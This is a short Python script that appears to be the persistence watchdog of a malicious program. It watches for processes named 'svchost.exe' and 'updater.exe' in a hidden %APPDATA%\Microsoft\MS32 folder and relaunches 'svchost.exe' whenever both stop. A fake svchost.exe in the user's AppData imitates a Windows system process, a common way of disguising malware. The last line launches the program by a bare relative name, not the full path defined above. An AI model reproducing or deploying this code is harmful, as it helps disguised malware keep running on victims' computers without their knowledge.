from subprocess import check_output
from os import startfile, path, getenv
from time import sleep
import psutil

tries = 0
max = 12
svchost = path.join(getenv("APPDATA"), "Microsoft", "MS32", "svchost.exe")
updater = path.join(getenv("APPDATA"), "Microsoft", "MS32", "updater.exe")
def check(fp):
    for proc in psutil.process_iter(['pid', 'exe', 'name']):
        try:
            if proc.info['exe'] and path.normcase(proc.info['exe']) == path.normcase(fp):
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return False

while True:
    if not check(svchost) and not check(updater):
        tries = tries+1
        # print(tries)
        if tries > max: break
        sleep(1)
    else:tries = 0
    sleep(0.05)
startfile("svchost.exe")